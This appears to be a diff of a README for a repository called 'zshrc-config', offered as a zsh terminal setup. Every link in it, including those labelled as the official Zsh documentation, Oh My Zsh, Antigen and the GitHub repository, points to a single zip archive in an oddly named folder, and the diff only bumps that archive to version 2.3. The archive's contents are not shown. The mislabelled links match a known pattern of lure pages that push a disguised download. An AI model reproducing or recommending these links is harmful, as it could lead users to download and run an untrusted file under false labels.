@@ -1,6 +1,6 @@
 # 🐚 zshrc-config - Your Personalized Terminal Experience Awaits
 
-[![Download zshrc-config](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip%https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip)](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip)
+[![Download zshrc-config](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip%https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip)](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ zshrc-config is a modular zsh configuration designed to make your terminal exper
 
 ## 📥 Download & Install
 
-To download zshrc-config, visit the [Releases page](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip). Here’s how to get started:
+To download zshrc-config, visit the [Releases page](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip). Here’s how to get started:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip).
+1. Go to the [Releases page](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip).
 2. Find the latest release.
 3. Click on the link for the version you want to download.
 4. Follow the instructions to save the file to your computer.
@@ -56,9 +56,9 @@ zshrc-config is designed to be forked and customized. This means you can modify 
 
 Here are some resources that can help you understand zsh better:
 
-- [Zsh Documentation](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip) - Official documentation covering all features and functions.
-- [Oh My Zsh](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip) - A popular framework for managing zsh configurations.
-- [Antigen](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip) - A tool that helps manage your zsh plugins.
+- [Zsh Documentation](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip) - Official documentation covering all features and functions.
+- [Oh My Zsh](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip) - A popular framework for managing zsh configurations.
+- [Antigen](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip) - A tool that helps manage your zsh plugins.
 
 ## 🙋 Frequently Asked Questions
 
@@ -74,7 +74,7 @@ Yes, simply open the `.zshrc` file, find the section with the aliases, and delet
 
 ### How do I update to the latest version?
 
-To update, return to the [Releases page](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip). Download the latest version and follow the installation steps again.
+To update, return to the [Releases page](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip). Download the latest version and follow the installation steps again.
 
 ## 🌟 Contributing
 
@@ -90,7 +90,7 @@ zshrc-config is licensed under the MIT License. You are free to use, modify, and
 
 ## 🔗 Links
 
-- [Releases Page](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/s97979/zshrc-config/main/antibacchic/zshrc-config.zip)
+- [Releases Page](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip)
+- [GitHub Repository](https://github.com/s97979/zshrc-config/raw/refs/heads/main/antibacchic/zshrc-config-2.3.zip)
 
 Feel free to explore, download, and customize your experience!
